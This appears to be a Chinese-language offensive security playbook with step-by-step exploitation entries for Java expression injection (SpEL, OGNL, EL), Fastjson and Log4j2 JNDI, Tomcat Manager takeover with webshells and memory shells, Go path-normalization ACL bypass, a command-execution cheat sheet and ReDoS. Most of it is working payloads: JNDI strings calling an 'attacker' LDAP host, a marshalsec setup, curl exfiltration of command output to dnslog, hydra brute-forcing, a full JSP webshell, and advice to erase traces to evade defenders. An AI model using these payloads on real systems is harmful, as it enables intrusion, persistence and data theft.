## [g-java] Java——表达式注入、反序列化与 JNDI

### [java-spel-ognl] SpEL、OGNL 与 EL 表达式注入 | medium | spel;ognl;el;struts2 | SpEL
> 用户输入被拼进表达式引擎解析即等于任意 Java 代码执行，Spring（SpEL）与 Struts2（OGNL）是两个高频载体。

#### 这个条目的作用
当你看到一个 Java 应用里出现了 `${...}`、`#{...}` 或 `%{...}` 这样的模板语法，并且其中混入了你提交的参数时，本条目教你按「先探测、再分类、后打 RCE」的顺序走完 SpEL / OGNL / EL 三条表达式注入利用路线。判定不准时最怕的就是在错误的引擎上打错误的 payload，白白消耗时间。

#### 前置条件
- 找到一个用户输入会被拼进表达式、模板或注解的入口（常见于搜索排序、报表模板、消息推送模板、`@Value` 驱动的配置接口、Struts2 的 action 参数）。
- 有回显最好；无回显时准备好 dnslog（如 dnslog.cn / ceye.io）和延时探测手段。
- 记住版本意识：Spring 6 / SpEL 6 收紧类型访问，老 payload 可能失效；Struts2 各版本对 `_memberAccess` 的限制也不同。

#### 第 1 步：探测表达式是否真的被解析
先发一个纯计算表达式，看回显里有没有结果：
```txt
${7*7}
#{7*7}
%{7*7}
```
预期结果：回显里出现 `49`，说明该位置存在表达式解析。如果三种都无回显，再试延时探测区分「不解析」和「无回显但已执行」：
```txt
${T(java.lang.Thread).sleep(5000)}
```
如果请求耗时明显超过 5 秒，说明表达式已执行但没有回显——走后面的「无回显利用」小节。

> [!tip] 不同框架的默认表达式外壳：Spring/SpEL 常见 `${...}` 与 `#{...}`，Struts2/OGNL 常见 `%{...}` 与 `${...}`，JSP/EL 就是 `${...}`。外壳本身不决定引擎，最终以探测结果为准。

#### 第 2 步：SpEL（Spring）命令执行
确认是 SpEL 后，直接打命令执行：
```java
T(java.lang.Runtime).getRuntime().exec("id")
new java.lang.ProcessBuilder(new String[]{"sh","-c","id"}).start()
''.getClass().forName("java.lang.Runtime").getRuntime().exec("id")
```
预期结果：回显出现 `id` 的输出（uid=...），或经 dnslog/延时确认已执行。
如果不行：
- `exec("id")` 这种方式按空白切分参数，`id` 这种单命令可以，但管道/重定向会报错，改用 `new ProcessBuilder(new String[]{"sh","-c","你的整条命令"}).start()`。
- 报错提示类型访问被限制（Spring 6+），改用反射链写法（见第 4 步）或确认目标版本。

#### 第 3 步：SpEL 无回显利用
无回显时三选一：
```java
// 1. dnslog 带外
T(java.net.InetAddress).getByName("你的子域.dnslog.cn")
// 2. 延时确认
T(java.lang.Thread).sleep(5000)
// 3. 命令结果写入静态字段再找机会读
new java.lang.String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get("/flag")))
```
预期结果：dnslog 平台收到解析记录，或请求明显卡顿 5 秒。第三种适合应用本身会回显某个静态字段/对象的场景，属于进阶技巧。

#### 第 4 步：关键词被过滤时的绕过
`Runtime`、`exec` 这类关键词被 WAF/黑名单拦截时：
```java
// 方式一：Unicode 转义插在类名里（SpEL 解析期还原）
T(java.lang.Cha\u0072acter)
// 方式二：用 byte[] 拼出被过滤的类名，forName 反射加载
''.getClass().forName(new String(new byte[]{106,97,118,97,46,108,97,110,103,46,82,117,110,116,105,109,101})).getRuntime().exec("id")
```
方式二的 byte[] 就是 `java.lang.Runtime` 的 ASCII 码（106=j,97=a,118=v,97=a,46=.,108=l,97=a,110=n,103=g,46=.,82=R,117=u,110=n,116=t,105=i,109=m,101=e）。按同样的办法可以把 `exec` 等也拆开拼。

#### 第 5 步：OGNL（Struts2）利用
Struts2 对 `%{...}`、`${...}` 会二次解析，且 OGNL 默认禁止静态方法访问，先放开再执行：
```txt
%{#_memberAccess['allowStaticMethodAccess']=true,@java.lang.Runtime@getRuntime().exec('id')}
```
预期结果：回显 `id` 输出。
如果不行：
- 现代 OGNL 已封 `_memberAccess`，改用 `#context['com.opensymphony.xwork2.ActionContext.container']` 系列变体，或直接打历史 CVE 的现成链：S2-016（`redirect:` 参数）、S2-045（`Content-Type` 头）、S2-057（namespace）。
- 判定 Struts2 本身：URL 加 `?redirect:${7*7}` 看是否回显 49，或看响应头 `X-Struts-Version`。

#### 第 6 步：EL（JSP/JUEL）利用
EL 2.2+ 支持直接调方法：
```txt
${pageContext.request.getClass().forName("java.lang.Runtime").getRuntime().exec("id")}
```
预期结果：回显 `id` 输出；探测用 `${7*7}` 回显 49。
注意：`T()` 是 SpEL 专属写法，EL 里不能用；EL 里用 `''.getClass()` 拿 Class 对象再 `.forName(...)` 是通用套路。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 三种 `${/#/%{7*7}}` 都无回显 | 表达式根本没被解析，或入口不对 | 先找真正会把输入拼进表达式的位置，别在错误入口浪费时间 |
| 有回显但报「Type cannot be found」 | SpEL 6 / Spring 6 收紧类型访问 | 改用反射链（byte[] 拼类名 + forName），或确认目标版本换老 payload |
| `exec("sh -c id")` 报错 | `exec(String)` 按空白切分，管道/重定向失效 | 用 `ProcessBuilder(new String[]{"sh","-c",cmd})` |
| OGNL 提示 `_memberAccess` 被禁 | 新版 Struts2 封了该键 | 换 `#context[...]` 容器变体或历史 CVE 链 |
| 表达式已执行但永远看不到输出 | 无回显环境 | dnslog / 延时 / 写静态字段，别死等回显 |

#### 实战要点
- 探测永远先于利用：`7*7` → 49 这一下就把「是不是表达式注入」钉死了，还能区分引擎外壳。
- 无回显时先做 5 秒延时探测，一次请求就能确认「已执行」，比反复猜回显位置高效。
- SpEL 里 `T()` 类型引用、OGNL 里 `@类@静态方法`、EL 里 `''.getClass().forName()` 是三种引擎各自的标志性写法，见到就能反推引擎。
- 历史 CVE 链（S2-016/045/057）是 Struts2 题的最快入口，先试版本链再手写 OGNL。
- 关键词过滤时优先 byte[] 拼类名，它能绕掉所有「字符串包含」型黑名单。
- 所有 payload 先本地起同版本 Spring/Struts 验证一遍，版本差异导致的失效在实战里极其常见。

### [java-fastjson-log4j] Fastjson autoType 与 Log4j2 JNDI | medium | fastjson;log4j2;jndi;deserialization | gadget
> JSON 反序列化的 `@type` 自动装配与日志库的 `${jndi:}` lookup，都走 JNDI 远程加载类达成 RCE。

#### 这个条目的作用
Fastjson 与 Log4j2 是 Java 生态里两个「用户输入 → 反序列化/JNDI → RCE」的最常见载体。本条目带你把「判断版本 → 出网探测 → 打 JNDI 链 → 不出网泄露」整条流程走一遍，并能区分 Fastjson 1.2.x 各版本的黑名单差异与 Log4j2 打补丁前后的行为变化。

#### 前置条件
- 一个会把 JSON 提交到 `JSON.parseObject`/`JSON.parse` 的接口（POST 带 `Content-Type: application/json` 的常见后端）。
- 一个会把用户输入写进日志的位置（登录名、User-Agent、搜索词、异常消息）。
- 一台你能控制的 VPS：上面跑 marshalsec（JNDI 服务）或直接用 `java -jar JNDI-Injection-Exploit.jar`，另备 dnslog 域名。
- 记住两个版本分水岭：Fastjson 1.2.24（黑名单之前）、1.2.47（Class 缓存绕过）；Log4j2 2.15.0（`${jndi:}` 默认禁用）。

#### 第 1 步：确认 Fastjson 版本与解析入口
提交一个会触发解析报错的 JSON，从报错堆栈看版本：
```json
{"@type":"com.sun.rowset.JdbcRowSetImpl"}
```
预期结果：报错里出现 fastjson 类名与版本号（如 `fastjson-1.2.47`），或直接看到 `autoType is not support`。
如果不行：换 `{"a":"\x"}` 这类非法转义触发解析异常，从堆栈找 `com.alibaba.fastjson` 字样。版本决定后面选哪条链，必须确认。

#### 第 2 步：出网探测（确认 JNDI 可达）
```json
{"@type":"java.net.Inet4Address","val":"你的子域.dnslog.cn"}
```
预期结果：dnslog 平台收到 `你的子域.dnslog.cn` 的解析记录，说明 JNDI/出网链路通。
如果不行：目标不出网，跳过远程加载，改用第 5 步的「不出网泄露」或本地 gadget 链。

> [!warn] `Inet4Address` 探测只验证「能否触发类初始化出网」，不代表 JNDI 服务链能成；远程加载还受 JDK 版本 `trustURLCodebase` 限制（见第 3 步）。

#### 第 3 步：Fastjson @type JNDI 链（1.2.24 前 / 无黑名单）
经典 JdbcRowSetImpl 链：
```json
{"@type":"com.sun.rowset.JdbcRowSetImpl",
 "dataSourceName":"ldap://attacker:1389/Exploit","autoCommit":true}
```
预期结果：目标回连你的 LDAP 服务，加载 Exploit 类执行命令（弹计算器/反弹 shell/写文件均可验证）。
如果不行：
- 1.2.25 ~ 1.2.41 之间黑名单已生效，`com.sun.rowset.JdbcRowSetImpl` 被拦，先试 1.2.47 绕过（第 4 步）。
- JDK ≥ 8u191 默认 `trustURLCodebase=false`，LDAP 远程加载类被禁：改用「LDAP 返回序列化数据打本地 gadget」（ysoserial 的 CommonsCollections 等），或打目标 JDK 版本可用的绕过。
- 无可用 gadget 时，退而求其次用 TemplatesImpl 链：`_bytecodes` 塞恶意类字节码（base64），`getOutputProperties()` 触发 `defineClass`，需要目标类先被 loadClass 缓存。

#### 第 4 步：1.2.47 黑名单绕过（Class 缓存）
```json
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}}
```
预期结果：利用 `java.lang.Class` 的缓存特性把目标类塞进缓存，绕过黑名单后触发 JNDI 回连。
如果不行：1.2.48 起 `java.lang.Class` 也被加黑，此链失效，改试 `cache` 字段相关变体或直接放弃 autoType 路线。

> [!warn] Fastjson 2.x 已默认关闭 `@type` 自动装配，`JSON.parseObject(input)` 不再默认实例化任意类；先确认目标真的在用 1.2.x，否则整条链都不成立。

#### 第 5 步：Log4j2 JNDI（CVE-2021-44228，< 2.15.0）
任何把用户输入写进日志的地方都是触发点：登录名、UA、搜索词、异常消息。Payload：
```txt
${jndi:ldap://attacker:1389/Exploit}
${jndi:rmi://attacker:1099/Exploit}
${jndi:ldap://${sys:java.version}.x.dnslog.cn}   # 子 lookup 带外泄露 java 版本
```
预期结果：目标日志系统解析 `${jndi:...}`，发起对 attacker 的 LDAP/RMI 连接；子 lookup 形式会在 dnslog 里看到 java 版本号。
如果不行：
- 2.15.0 起 `JndiLookup` 默认被禁用、2.16.0 起默认移除——先确认版本。
- 不出网也能泄露信息，用内置 lookup 把敏感值拼进回显或报错：
```txt
${env:JAVA_HOME}    ${sys:user.name}    ${ctx:loginId}
${lower:HELLO}      ${date:yyyy-MM-dd}  ${env:PATH}
```

#### 第 6 步：搭 JNDI 服务（自己这边怎么准备）
```bash
git clone https://github.com/mbechler/marshalsec
cd marshalsec && mvn package -DskipTests
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://attacker:8000/#Exploit" 1389
# 另开一个终端起 HTTP 服务提供 Exploit.class：
python3 -m http.server 8000
```
预期结果：`LDAPRefServer` 监听 1389，收到目标连接后指引其从 `http://attacker:8000/Exploit.class` 加载类。Exploit 类只需实现 `static` 块或 `ObjectFactory` 接口，在静态初始化里执行命令。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
| --- | --- | --- |
| `@type` payload 完全无反应 | 版本黑名单拦截，或 Fastjson 2.x 默认关 autoType | 先确认版本，再换 1.2.47 绕过链 |
| JNDI 服务收到连接但没执行命令 | JDK ≥ 8u191 禁远程加载类 | LDAP 返回序列化数据打本地 gadget（ysoserial） |
| dnslog 一直没记录 | 目标不出网 | 放弃远程链，用 `${env:...}` 等内置 lookup 泄露 |
| Log4j2 payload 打进日志没反应 | 目标已升级到 2.15.0+ | 确认版本；新版需配置开启或找别的洞 |
| 报错「autoType is not support」 | 显式 `Feature.SupportAutoType` 未开且版本默认关闭 | 找其他入口，或利用已存在的 `@type` 使用点 |

#### 实战要点
- 版本决定一切：Fastjson 的 1.2.24 / 1.2.47 / 1.2.48 和 Log4j2 的 2.15.0 是四条硬分水岭，先确认版本再选 payload。
- 出网探测放最前：`Inet4Address` 一条 dnslog 就能区分「链子没通」和「根本不出网」，别闷头打远程加载。
- JNDI 服务端要自己先本地验证一遍（本机 curl 一下 LDAPRefServer），排除服务端配置问题。
- 无回显是常态：命令执行结果靠 dnslog（`${sys:java.version}.你的域名`）、延时、或写文件后二次读取确认。
- 打补丁不代表漏洞消失：Log4j2 2.15.0 的 `formatMsgNoLookups` 可被配置重新打开，Fastjson 黑名单也总被新绕过链击穿。
- 所有链子先在自己搭的同版本环境里跑通，再打目标；JNDI 链路长、变量多，任何一环错都表现为「没反应」。

### [java-tomcat-others] Tomcat Manager 弱口令与内存马 | hard | tomcat;webshell;manager;memory-shell | WAR
> Manager 弱口令直接部署 WAR 拿 shell；内网/实战目标更偏好无文件落地的内存马。

#### 这个条目的作用
拿到一个 Tomcat 应用的登录/部署面时，弱口令 → WAR 部署是最高效的 getshell 路径；而当目标在内网、有杀软或不允许写文件时，本条目再带你理解内存马的原理与注入思路，做到「先拿文件马，再考虑内存马」。

#### 前置条件
- 目标开放 8080（或自定义端口），能访问 `/manager/html` 或 `/manager/text`。
- 一个 WAR 打包环境（`jar` 命令即可）和任意语言的 webshell 源码（jsp/jspx）。
- 理解 Manager 角色模型：`manager-gui` 才能用 HTML 界面，`manager-script` 才能用 text 接口部署。

#### 第 1 步：探测 Manager 管理面
```bash
curl -i http://target:8080/manager/html
curl -i http://target:8080/manager/text/list
```
预期结果：返回 `401 Unauthorized` 且响应头带 `WWW-Authenticate: Basic realm="Tomcat Manager Application"`——说明管理面存在且启用了 Basic Auth，可以暴破。
如果不行：返回 404 说明 Manager 组件没装或路径不同（试试 `/manager/status`、`/host-manager/html`）；返回 200 说明根本没开认证，直接进第 3 步。

#### 第 2 步：弱口令暴破
常见默认口令先手测：
```bash
curl -u tomcat:tomcat http://target:8080/manager/text/list
curl -u admin:admin http://target:8080/manager/text/list
curl -u tomcat:s3cret http://target:8080/manager/text/list
curl -u manager:manager http://target:8080/manager/text/list
```
预期结果：某个组合返回 200 和已部署应用列表（`OK - Listed applications...`），记下这组口令。
如果不行：用 hydra 跑字典（用户与口令常见于 `tomcat`、`admin`、`manager`、`role1`、`s3cret`、`changethis` 等）：
```bash
hydra -L users.txt -P pass.txt target -s 8080 -f http-get /manager/html
```

> [!tip] 老版本（Tomcat 5/6）默认配置带 `tomcat/tomcat` 与 `admin/admin`；新版默认只有注释掉的示例用户，但运维常自己配回弱口令。

#### 第 3 步：制作 Webshell WAR
```bash
mkdir shell
# 写 shell.jsp（内容见下），再写 WEB-INF/web.xml 声明 servlet
cat > shell/shell.jsp <<'EOF'
<%
java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("c")).getInputStream();
java.io.BufferedReader r = new java.io.BufferedReader(new java.io.InputStreamReader(in));
String l; while ((l = r.readLine()) != null) out.println(l);
%>
EOF
mkdir -p shell/WEB-INF
cat > shell/WEB-INF/web.xml <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee" version="3.1">
  <servlet><servlet-name>s</servlet-name><jsp-file>/shell.jsp</jsp-file></servlet>
  <servlet-mapping><servlet-name>s</servlet-name><url-pattern>/x</url-pattern></servlet-mapping>
</web-app>
EOF
jar -cvf shell.war -C shell .
```
预期结果：生成 `shell.war`，内含 `shell.jsp` 与 `WEB-INF/web.xml`。

#### 第 4 步：部署 WAR
```bash
curl -u tomcat:tomcat -T shell.war "http://target:8080/manager/text/deploy?path=/shell"
```
预期结果：返回 `OK - Deployed application at context path /shell`。
如果不行：
- 401 → 口令不对或该用户缺 `manager-script` 角色（`manager-gui` 用户只能用 HTML 界面，用表单上传而非 text 接口）。
- 403 → 该用户角色无权部署，找别的用户或换 `/manager/html` 上传界面。

#### 第 5 步：访问 Webshell 验证
```bash
curl "http://target:8080/shell/x?c=id"
curl "http://target:8080/shell/shell.jsp?c=id"
```
预期结果：回显 `id` 的输出（uid=...）。之后把 `c` 参数换成 `whoami`、`cat /flag` 等即可。
如果不行：403/404 检查 context path 与 web.xml 映射是否一致；500 检查 jsp 语法（注意 `Runtime.getRuntime().exec` 不支持管道，复杂命令改传 `bash -c` 需先写脚本或用第 6 步的成熟马）。

> [!tip] 实战直接换成冰蝎/哥斯拉的 jsp 马，命令执行更稳、支持流量加密；上面这个 5 行马只用于 CTF 环境自证链路。

#### 第 6 步：内存马（无文件落地，简述）
拿到代码执行点但不想/不能写文件时，注入内存马：
- 类型：Filter / Servlet / Listener / Valve / Agent（Instrumentation），注册进运行中的 Tomcat 内存，重启即消失。
- 注入路径：代码执行（反序列化/JNDI 回显）→ 拿 `StandardContext`（`Thread.currentThread().getContextClassLoader()` 反推或反射从 `org.apache.catalina.core.ApplicationContext` 取）→ 动态 `addFilter`/`addServlet` 注册恶意组件 → 访问特定 URL 即触发。
- Spring Boot 环境则动态注册 `Controller`；高权限场景用 Agent 字节码注入（`Instrumentation.appendToBootstrapClassLoaderSearch` 等）。
- 代表工具：冰蝎/哥斯拉的内存马版、`java-memshell-generator`（一键生成各类型内存马）。
- 检测：内存马无文件，杀软看不见；防守方靠 arthas 扫描类加载器、jmap dump 后分析。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 部署接口 401/403 | 口令错误或角色不足 | 暴破拿 `manager-script` 用户；GUI 用户走 `/manager/html` 表单 |
| 部署成功但访问 404 | context path 或映射写错 | 核对 `/shell/x` 与 web.xml 的 `<url-pattern>` |
| shell 执行 `ls -la` 报错 | `exec(String)` 不支持管道/参数 | 用冰蝎等成熟马，或先写脚本再执行 |
| WAR 上传后 500 | jsp 编译错误或 lib 缺失 | 本地先解压验证结构（WEB-INF 必须在根下） |
| 内网主机有杀软不让写马 | 文件落地被查 | 转内存马路线，无文件不落地 |

#### 实战要点
- 先探测再暴破：401 带 Basic Auth 头才值得跑字典，200 直达等于送分。
- text 接口比 GUI 好用：`/manager/text/deploy` 一条 curl 完成部署，脚本化快得多。
- WAR 的 `WEB-INF/web.xml` 用 `<jsp-file>` 声明能把 jsp 伪装成任意路径的 servlet，隐蔽性更好。
- 内存马的核心是拿到 `StandardContext` 后动态注册组件，链路是「代码执行 → 拿 Context → addFilter/addServlet」。
- CTF 场景文件马够用；实战/内网优先内存马 + 冰蝎流量加密，兼顾落地与隐蔽。
- 拿下 shell 后记得清痕迹：删除上传的 WAR（`/manager/text/undeploy?path=/shell`），避免被值守发现。

## [g-misc] 其他语言与解析——Go 路径、命令速查、ReDoS 与黑名单

### [go-net-http-path] Go net/http 路径清理特性 | medium | go;net-http;path-normalization | trailing-slash
> Go 的 ServeMux 会清理点路径并做一次解码，与 Nginx/网关的二次解码或不同步解码叠加时，同一个 URL 在两层看到的路径不同。

#### 这个条目的作用
Go 后端前面通常挂着 Nginx 做反向代理和 ACL。两者对 URL 的「解码次数」和「路径清理」规则不一致，导致同一请求在网关层看到的路径和 Go 路由层看到的路径不同——这就是路径规范化差异绕过（path normalization bypass）的立足点。本条目带你理解 Go 的清理/解码规则，并给出一套可复现的探测流程。

#### 前置条件
- 目标架构是「Nginx（或某网关）→ Go 服务（net/http / gin / httprouter）」，且网关层有基于路径前缀的 ACL（比如 `/admin` 开头被拦截）。
- 本地有 Go 环境或一个能临时起 http 服务的沙箱，用来验证 payload 在目标框架下的真实行为。
- 记住两个核心事实：`net/url` 的 `Path` 是已解码字段；`ServeMux` 会对点路径做清理并 301。

#### 第 1 步：本地复现 Go 的路径行为
```go
package main

import (
	"fmt"
	"net/http"
	"net/url"
)

func main() {
	http.HandleFunc("/secret", func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprintf(w, "Path=%q RawPath=%q\n", r.URL.Path, r.URL.RawPath)
	})
	http.ListenAndServe(":8080", nil)
}
```
分别请求：
```bash
curl -i 'http://localhost:8080/a/../secret'   # 观察 301 → /secret
curl -i 'http://localhost:8080/a%2f..%2fsecret'
curl -i 'http://localhost:8080/%252e%252e%252fsecret'
```
预期结果：`/a/../secret` 被 301 重定向到 `/secret`；`a%2f..%2fsecret` 的 `Path` 显示为 `/a/../secret`（`%2f` 已被解码成 `/`）；`%252e%252e%252fsecret` 的 `Path` 里仍是字面 `%2e%2e%2f`（Go 只解一层，`%25` 解码后是 `%`）。

#### 第 2 步：找出网关与 Go 的解码差异
核心错位模型是「网关解一层、Go 也解一层」之外的两种情况：
- 网关解一层后按 location 前缀匹配，Go 再解一层后清理：`/admin%2f..%2fsecret` 在 Nginx 侧按 `/admin` 前缀匹配（被放行或命中 ACL），在 Go 侧 `Path` 是 `/admin/../secret`，清理后是 `/secret`。
- 二次编码：`/admin%252f..%252fsecret` 网关解一层得 `/admin%2f..%2fsecret`，Go 只解一层仍是字面——若网关还有一层代理再解，就会在 Go 侧变成 `/admin/../secret`。

```
Nginx（解一层）        Go ServeMux（再解+清理）
/admin%2f..%2fsecret → /admin/../secret → 301 /secret
/admin%252f..%252fsecret → /admin%2f..%2fsecret → 字面 %2f（不再解）
```
预期结果：理解「每一层代理都可能有自己的解码动作」，错位就产生在层数不对等时。

#### 第 3 步：构造绕过 ACL 的 payload 并验证
针对「Nginx 按 `/admin` 前缀封禁、Go 路由有 `/admin` 页面」的场景，逐个测试：
```txt
/admin%2f..%2fadmin
/admin%2e%2e%2fadmin
/admin%252f..%252fadmin
/admin%2f%2e%2e%2fadmin
/admin..;/admin
/admin/..%2fadmin
```
预期结果：网关层这些串不匹配 `/admin` 前缀（含编码字符），放行到 Go；Go 层解码清理后实际路由到 `/admin`，从而绕过 ACL。
如果不行：换框架行为核对——gin 与 httprouter 是「精确段匹配」风格（`%2f` 不会当路径分隔符，会 404），跟 ServeMux 的清理行为不同，payload 必须按目标框架调整。

> [!warn] Go 1.22 起 ServeMux 路由增强（支持 method 前缀与通配符），gin/httprouter 的段匹配规则又与标准库不同——同一批 payload 在不同框架上表现可能完全相反，先本地实测再打目标。

#### 第 4 步：验证绕过的最终效果
绕过 ACL 后，用会暴露路由处理结果的方式确认真的命中了受保护路由：
```bash
curl -i 'http://target/admin%2f..%2fsecret'    # 观察最终状态码与页面内容
curl -i 'http://target/%2e%2e%2fadmin'          # 根级 .. 变体
```
预期结果：返回受保护页面的内容（200 + 页面特征），而直接访问 `/admin` 被网关 403/拦截。
如果不行：检查网关层是否做了规范化（Nginx `merge_slashes`、`normalize_path`、`$uri` 的 `%XX` 解码行为），网关自身先规范化了就不存在错位。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
| --- | --- | --- |
| `/a/../b` 直接 404 而非 301 | 用的是 gin/httprouter 而非 ServeMux | 按段匹配框架重测 payload，`..` 不在段匹配语义里 |
| 二次编码 payload 全部 404 | 中间只有一层代理，没有「多解一层」 | 确认代理链层数，只保留恰好错位一层的编码 |
| 网关把编码串也拦截了 | Nginx 配置了 `merge_slashes off` 或自定义 normalize | 换不触发网关规范化的变体（分号、反斜杠、多点） |
| 绕过成功但拿到的是 404 页面 | Go 侧路由实际不存在该路径 | 先用正常路径确认受保护路由真实存在 |
| `%252f` 在 Go 侧变成字面 `%2f` 后 404 | Go 只解一层，字面 `%2f` 不是路径分隔符 | 需要多一层代理的解码，否则这条路走不通 |

#### 实战要点
- 核心心法：每一层代理都可能解码、都可能清理，错位只发生在「层与层的解码次数/清理规则不一致」时。
- 探测顺序：先本地复现目标框架的清理/解码行为，再构造恰好错位一层的编码 payload，最后打目标。
- `%2e%2e%2f`、`..%2f`、`%252e%252e%252f`、`..;/`、反斜杠、双斜杠是六个必测变体，按框架挑。
- 网关侧先确认它有没有开规范化（`normalize_path`、`merge_slashes`、URL 解码类指令），开了就没戏。
- 实战里这种题通常是「网关 ACL 放行 + Go 路由命中」，拿到 200 与受保护页面特征才算绕过成立，301 本身不算。

### [lang-command-file-cheatsheet] 各语言命令执行与文件读取速查表 | easy | cheatsheet;command;file-read | -
> 把"已控代码执行点"翻译成目标语言的系统命令/文件读取一行写法，CTF 与实战都靠这张表换语言。

#### 这个条目的作用
你已经找到了一个代码执行点（SSTI、反序列化、表达式注入、命令注入），但目标语言不是你最熟的那门——本条目就是一张「换语言」的速查表：每种语言命令执行怎么写、文件读取怎么写、无回显时怎么办。背下来或收藏，拿到执行点直接对照抄。

#### 前置条件
- 已确认存在代码/命令执行点，知道目标语言（从报错、框架、后缀判断）。
- 明确当前是「命令执行」还是「代码执行」：命令执行直接把字符串喂给系统 shell；代码执行要先调用该语言执行系统命令的函数。
- 无回显时备好 dnslog 或延时探测手段。

#### 第 1 步：命令执行——按语言选写法
| 语言 | 写法 |
| --- | --- |
| PHP | `system($cmd)`、`shell_exec($cmd)`、反引号、`popen($cmd,'r')` |
| Python | `os.system(cmd)`、`os.popen(cmd).read()`、`subprocess.check_output(cmd,shell=True)` |
| Node | `require('child_process').execSync(cmd).toString()`、`exec`/`spawn` |
| Java | `Runtime.getRuntime().exec(cmd)`（不走 shell）、`new ProcessBuilder("sh","-c",cmd).start()` |
| Go | `exec.Command("sh","-c",cmd).Output()` |
| Ruby | 反引号、`system(cmd)`、`IO.popen(cmd).read` |
| Perl | `system(cmd)`、反引号、`open(P,'cmd \|')` |

预期结果：能回显时直接看到命令输出。注意 Java 两行的区别：`exec(String)` 按空白切分参数、不经过 shell，管道和通配符会报错；`ProcessBuilder("sh","-c",cmd)` 才走完整 shell。

#### 第 2 步：文件读取——按语言选写法
| 语言 | 写法 |
| --- | --- |
| PHP | `file_get_contents($f)`、`readfile($f)` |
| Python | `open(f).read()`、`pathlib.Path(f).read_text()` |
| Node | `require('fs').readFileSync(f,'utf8')` |
| Java | `new String(Files.readAllBytes(Paths.get(f)))` |
| Go | `os.ReadFile(f)` |
| Ruby | `File.read(f)` |

预期结果：把 `f` 换成 `/flag`、`/etc/passwd`、`/proc/self/environ` 等目标文件路径，回显文件内容。

#### 第 3 步：无回显时的确认手段
优先 dnslog 与延时，别死等回显：
```txt
Python: __import__('os').popen('curl http://你的.dnslog.cn/'+__import__('os').getcwd()).read()
Node:   require('child_process').execSync('curl http://你的.dnslog.cn/'+process.cwd()).toString()
Java:   Runtime.getRuntime().exec(new String[]{"bash","-c","curl http://你的.dnslog.cn/$(id|md5sum|cut -d\\  -f1)"})
Go:     exec.Command("bash","-c","curl http://你的.dnslog.cn/$(whoami|md5sum|cut -d' ' -f1)").Output()
```
预期结果：dnslog 平台收到带命令结果的子域名解析（如 `xxx.你的.dnslog.cn`）。用 `md5sum|cut` 把命令输出压缩成子域名能接受的短串，是 CTF 外带的标准姿势。

> [!warn] 外带域名只允许字母数字和短横线，命令输出要先 md5/编码压缩；`curl` 不存在时用 `wget`、`nc` 或 `ping` 替代。

#### 第 4 步：命令执行失败时的排查
- Java `exec(String)` 不支持管道：改用 `bash -c` 数组形式，或先 `echo` 脚本再执行。
- 引号被过滤：外层用 `sh -c` 整串提交，内层引号按目标语言转义（Python/Node 里 `\\"` 或交替单双引号）。
- 空格被过滤：换 `${IFS}`（bash）、`%20`、`$IFS$9`（见 regex-redos-blacklist 条目）。
- 无 `curl`：用 `wget`、`python3 -c`、`nc`、`ping -c 1 域名`（ping 也能外带，看 DNS 解析记录）。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
| --- | --- | --- |
| Java 执行 `ls -la` 报错 | `exec(String)` 按空白切分，参数被拆开 | `new ProcessBuilder("sh","-c",cmd)` |
| Python `os.system` 无输出 | `os.system` 只返回退出码不捕获输出 | `os.popen(cmd).read()` 或 `subprocess.check_output` |
| 外带子域名太长/含非法字符 | 命令输出没压缩 | md5sum + cut 取前段，或 base64 后分段 |
| Node 里 `execSync` 无回显 | 输出是 Buffer | `.toString()` 转字符串 |
| Go `exec.Command` 无输出 | 没调 `.Output()`/`.CombinedOutput()` | 记得补 `.Output()` 并处理 err |

#### 实战要点
- 一张表换语言：命令执行看第 1 步、文件读取看第 2 步，SSTI/反序列化/表达式注入的 payload 里直接嵌这些写法。
- Java 是唯一「默认不走 shell」的语言，`exec(String)` 与 `exec(String[])` 是两种语义，最容易踩坑。
- 无回显三件套：dnslog、延时、写文件二次读，按顺序试。
- 先确认目标有没有 `curl`/`wget`，没有就换 nc/ping/python3 外带。
- 拿到执行点第一件事是 `id`/`whoami` 确认身份，再决定读 `/flag`、`/etc/passwd` 还是横向。

### [regex-redos-blacklist] ReDoS 与黑名单绕过 | hard | redos;waf-bypass;filter;case-folding | blacklist
> 灾难性回溯让一个正则挂死进程；字符层黑名单则能用换行、编码和 Unicode 大小写折叠钻空子。

#### 这个条目的作用
两个独立但常一起考的课题：一是 ReDoS——精心构造的输入让服务端正则进入灾难性回溯，CPU 被打满、进程假死，本质是 DoS；二是字符层黑名单绕过——WAF/过滤正则拦了关键词，但换行、编码、大小写折叠这些字符层差异能让 payload 溜过去。本条目两条线都给你可操作的步骤与验证方法。

#### 前置条件
- ReDoS 需要一个「用户输入进正则」的点（路由正则、参数校验、WAF 规则）。
- 黑名单绕过需要知道过滤的大致形态（拦了哪些词、是大小写敏感还是先 `strtolower`）。
- 准备一个能测正则回溯的本地环境：Python 的 `timeit`、Node 的 `console.time`，或者直接对目标打请求看耗时。

#### 第 1 步：识别 ReDoS 高危模式
嵌套量词（一个量词套在另一个量词里）是灾难性回溯的根源：
```txt
(a+)+$        (a|aa)+$      ^(\w+\s?)+$
([a-zA-Z]+)*  ^(a+)+b$      ^(x+x+)+y$
```
预期结果：这些模式的共同点是「同一段字符可以被多种方式切分」，回溯时指数级枚举。比如 `(a+)+$` 对 30 个 `a` 加一个 `!`，匹配失败前要尝试天文数字种切分方式。
如果不行（看不出哪个正则高危）：套用判据——正则里是否存在「重叠可匹配」的嵌套量词（`(X+)+`、`(X|XX)*`、`(X\s?)+`），存在即高危。

#### 第 2 步：构造并验证 ReDoS 触发输入
```txt
# 目标正则 (a+)+$，输入 30 个 a 加一个 b（不匹配触发回溯）
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaab
# 目标正则 ^(\w+\s?)+$，输入大量 a 加一个 !
aaa...（凑 50 个）a!
```
本地验证（Python）：
```python
import re, time
t = time.time()
re.match(r'(a+)+$', 'a'*30 + 'b')
print(time.time() - t)   # 无任何限制时指数级变慢
```
